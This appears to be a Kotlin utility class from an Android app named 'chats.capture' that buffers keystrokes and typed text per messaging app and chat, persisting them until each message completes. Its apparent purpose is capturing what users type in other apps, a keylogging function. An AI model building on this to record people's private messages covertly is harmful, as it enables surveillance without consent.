package com.chats.capture.utils

import android.content.Context
import android.content.SharedPreferences
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import timber.log.Timber
import java.util.concurrent.ConcurrentHashMap

/**
 * Buffers key events for a message until it's complete.
 * Handles persistence for crash recovery and app switching.
 */
class MessageBuffer(private val context: Context) {
    
    private val gson = Gson()
    private val prefs: SharedPreferences = context.getSharedPreferences("message_buffers", Context.MODE_PRIVATE)
    
    // In-memory buffers: packageName -> BufferData
    private val buffers = ConcurrentHashMap<String, BufferData>()
    
    data class BufferData(
        val packageName: String,
        val appName: String,
        var chatIdentifier: String?,
        val keyHistory: MutableList<String> = mutableListOf(),
        var currentText: String = "",
        val startTime: Long = System.currentTimeMillis(),
        var lastKeyTime: Long = System.currentTimeMillis()
    )
    
    companion object {
        private const val KEY_BUFFER_PREFIX = "buffer_"
        private const val MESSAGE_TIMEOUT_MS = 5000L // 5 seconds
        private const val DEBOUNCE_MS = 50L // 50ms debounce for rapid typing
    }
    
    /**
     * Add a key event to the buffer for a package
     */
    fun addKeyEvent(
        packageName: String,
        appName: String,
        chatIdentifier: String?,
        text: String,
        keyEvent: String? = null
    ): BufferData {
        val buffer = buffers.getOrPut(packageName) {
            // Try to restore from SharedPreferences first
            restoreBuffer(packageName) ?: BufferData(
                packageName = packageName,
                appName = appName,
                chatIdentifier = chatIdentifier
            )
        }
        
        // Update buffer data
        buffer.chatIdentifier = chatIdentifier
        buffer.currentText = text
        buffer.lastKeyTime = System.currentTimeMillis()
        
        // Add to key history if provided
        if (keyEvent != null && keyEvent.isNotBlank()) {
            buffer.keyHistory.add(keyEvent)
        } else {
            // If no key event provided, add the text change
            buffer.keyHistory.add(text)
        }
        
        // Persist buffer
        persistBuffer(buffer)
        
        return buffer
    }
    
    /**
     * Check if a message is complete based on timeout
     */
    fun isMessageComplete(packageName: String): Boolean {
        val buffer = buffers[packageName] ?: return false
        val timeSinceLastKey = System.currentTimeMillis() - buffer.lastKeyTime
        return timeSinceLastKey >= MESSAGE_TIMEOUT_MS
    }
    
    /**
     * Mark message as complete (Enter key pressed or send button clicked)
     */
    fun markComplete(packageName: String) {
        val buffer = buffers[packageName] ?: return
        buffer.lastKeyTime = 0 // Mark as complete
    }
    
    /**
     * Get and clear completed buffer
     */
    fun getAndClear(packageName: String): BufferData? {
        val buffer = buffers.remove(packageName) ?: return null
        clearPersistedBuffer(packageName)
        return buffer
    }
    
    /**
     * Get buffer without clearing (for checking)
     */
    fun getBuffer(packageName: String): BufferData? {
        return buffers[packageName]
    }
    
    /**
     * Clear buffer (user switched apps or cancelled)
     */
    fun clearBuffer(packageName: String) {
        buffers.remove(packageName)
        clearPersistedBuffer(packageName)
    }
    
    /**
     * Get all buffers that have timed out
     */
    fun getTimedOutBuffers(): List<BufferData> {
        val now = System.currentTimeMillis()
        return buffers.values.filter { buffer ->
            val timeSinceLastKey = now - buffer.lastKeyTime
            timeSinceLastKey >= MESSAGE_TIMEOUT_MS && buffer.currentText.isNotBlank()
        }
    }
    
    /**
     * Persist buffer to SharedPreferences for crash recovery
     */
    private fun persistBuffer(buffer: BufferData) {
        try {
            val key = KEY_BUFFER_PREFIX + buffer.packageName
            val json = gson.toJson(buffer)
            prefs.edit().putString(key, json).apply()
        } catch (e: Exception) {
            Timber.e(e, "Error persisting message buffer")
        }
    }
    
    /**
     * Restore buffer from SharedPreferences
     */
    private fun restoreBuffer(packageName: String): BufferData? {
        return try {
            val key = KEY_BUFFER_PREFIX + packageName
            val json = prefs.getString(key, null) ?: return null
            val type = object : TypeToken<BufferData>() {}.type
            gson.fromJson<BufferData>(json, type)
        } catch (e: Exception) {
            Timber.e(e, "Error restoring message buffer")
            null
        }
    }
    
    /**
     * Clear persisted buffer
     */
    private fun clearPersistedBuffer(packageName: String) {
        try {
            val key = KEY_BUFFER_PREFIX + packageName
            prefs.edit().remove(key).apply()
        } catch (e: Exception) {
            Timber.e(e, "Error clearing persisted buffer")
        }
    }
    
    /**
     * Clear all buffers (on app start, restore from persistence)
     */
    fun clearAllBuffers() {
        buffers.clear()
        // Clear all persisted buffers
        val keys = prefs.all.keys.filter { it.startsWith(KEY_BUFFER_PREFIX) }
        prefs.edit().apply {
            keys.forEach { remove(it) }
            apply()
        }
    }
    
    /**
     * Restore all buffers from persistence (call on app start)
     */
    fun restoreAllBuffers() {
        try {
            val keys = prefs.all.keys.filter { it.startsWith(KEY_BUFFER_PREFIX) }
            keys.forEach { key ->
                val packageName = key.removePrefix(KEY_BUFFER_PREFIX)
                val buffer = restoreBuffer(packageName)
                if (buffer != null) {
                    buffers[packageName] = buffer
                }
            }
        } catch (e: Exception) {
            Timber.e(e, "Error restoring all buffers")
        }
    }
}
